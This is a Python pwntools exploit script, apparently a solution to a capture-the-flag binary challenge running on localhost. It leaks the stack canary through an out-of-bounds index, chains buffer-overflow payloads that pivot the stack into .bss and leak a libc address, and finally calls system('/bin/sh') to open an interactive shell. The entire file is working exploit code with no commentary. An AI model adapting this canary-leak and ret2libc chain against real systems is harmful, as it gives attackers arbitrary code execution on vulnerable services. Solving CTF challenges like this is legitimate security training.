from pwn import *

# p = process('./chall')
p = remote('localhost',1557)
e = ELF('./chall')
libc = ELF('./libc.so.6')
canary = b''

for i in range(-226,-218):
    p.sendline(b'1')  
    p.sendlineafter(b'leak: ', str(i).encode())
    byte = p.recvuntil(b'\n').strip()
    canary += byte

canary = int.from_bytes(canary[::-1], 'big')
log.success(f"canary = {hex(canary)}")

main = 0x0000000000401277
bss = 0x404300
pop_rdi = 0x0000000000401243

payload = b'a'*0x18 + p64(canary) + p64(bss) + p64(main)
p.sendline('2')
p.sendafter('data: ',payload)
payload = b'a'*0x18 + p64(canary) + p64(bss+504) + p64(main) + p64(main)
p.send(payload)
payload = b'a'*0x18 + p64(canary) + p64(bss-8) + p64(main) + p64(main)
p.send(payload)
payload = b'a'*0x18 + p64(canary) + p64(bss+520) + p64(main) + p64(e.sym['puts'])
p.send(payload)
payload = b'a'*0x18 + p64(canary) + p64(bss-16) + p64(main) + p64(main)
p.send(payload)
payload = b'a'*0x18 + p64(canary) + p64(bss+1000) + p64(pop_rdi) + p64(e.got['read'])
p.send(payload)

libc_base = u64(p.recvline()[:-1].ljust(8,b'\x00')) -0x28000-0xec7d0-0x1b0
log.success(f'libc_base = {hex(libc_base)}')
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
bss = bss+1608

payload = b'a'*0x18 + p64(canary) + p64(bss + 192) + p64(main) + p64(main)
pause()
p.send(payload)
payload = b'a'*0x18 + p64(canary) + p64(bss - 8) + p64(main) + p64(main)
p.send(payload)
payload = b'a'*0x18 + p64(canary) + p64(bss + 288) + p64(main) + p64(system)
p.send(payload)
payload = b'a'*0x18 + p64(canary) + p64(bss - 16) + p64(main) + p64(main)
p.send(payload)
payload = b'a'*0x18 + p64(canary) + p64(bss - 16) + p64(pop_rdi) + p64(binsh)
p.send(payload)

p.interactive()